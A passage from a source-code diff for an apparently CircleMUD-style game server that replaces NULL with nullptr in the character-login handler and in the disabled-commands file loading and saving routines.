 	d->backstr = strdup(d->character->description);
       }
@@ -6867,35 +6870,35 @@ void nanny(struct descriptor_data *d, char *arg)
       if (!strcasecmp(d->tmp1, GET_NAME(d->character))) {
             if (d->tmp1) {
              free(d->tmp1);
-             d->tmp1 = NULL;
+             d->tmp1 = nullptr;
             }
        d->tmp1 = strdup("Empty");
       }
       if (!strcasecmp(d->tmp2, GET_NAME(d->character))) {
             if (d->tmp2) {
              free(d->tmp2);
-             d->tmp2 = NULL;
+             d->tmp2 = nullptr;
             }
        d->tmp2 = strdup("Empty");
       }
       if (!strcasecmp(d->tmp3, GET_NAME(d->character))) {
             if (d->tmp3) {
              free(d->tmp3);
-             d->tmp3 = NULL;
+             d->tmp3 = nullptr;
             }
        d->tmp3 = strdup("Empty");
       }
       if (!strcasecmp(d->tmp4, GET_NAME(d->character))) {
             if (d->tmp4) {
              free(d->tmp4);
-             d->tmp4 = NULL;
+             d->tmp4 = nullptr;
             }
        d->tmp4 = strdup("Empty");
       }
       if (!strcasecmp(d->tmp5, GET_NAME(d->character))) {
             if (d->tmp5) {
              free(d->tmp5);
-             d->tmp5 = NULL;
+             d->tmp5 = nullptr;
             }
        d->tmp5 = strdup("Empty");
       }
@@ -7050,7 +7053,7 @@ void load_disabled()
   if (disabled_first)
     free_disabled();
 
-  if ((fp = fopen(DISABLED_FILE, "r")) == NULL)
+  if ((fp = fopen(DISABLED_FILE, "r")) == nullptr)
     return; /* No disabled file.. no disabled commands. */
 
   while (get_line(fp, line)) { 
@@ -7087,7 +7090,7 @@ void save_disabled()
     return;
    }
 
-  if ((fp = fopen(DISABLED_FILE, "w")) == NULL) {
+  if ((fp = fopen(DISABLED_FILE, "w")) == nullptr) {
     log("SYSERR: Could not open " DISABLED_FILE " for writing");
     return;
   }
